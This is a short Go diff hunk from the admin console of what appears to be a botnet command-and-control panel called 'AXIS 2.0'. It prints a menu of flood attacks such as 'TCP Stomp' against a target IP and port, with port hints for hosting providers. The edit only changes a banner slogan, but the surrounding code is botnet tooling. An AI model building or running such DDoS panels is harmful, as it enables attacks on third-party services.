@@ -188,7 +188,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33mstomp [IP] [TIME] dport=[PORT]\x1b[1;35m   - TCP Stomp       ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════╦═══════════════╦═════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;35m║ CF Port: 80   ║  AXIS 2.0     ║  --> | Rules | <--  ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ NFO Port: 22  ║  FUCK ICE     ╠═════════════════════╣\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ NFO Port: 22  ║  KABOOM       ╠═════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;35m║ OVH Port: 995 ║  Made By AXIS ║  Don't spam!        ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════╩═══════════════╣  Don't share!       ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;35m║ iplookup - Looks up an IP     ║  Don't Bother!      ║\r\n"))
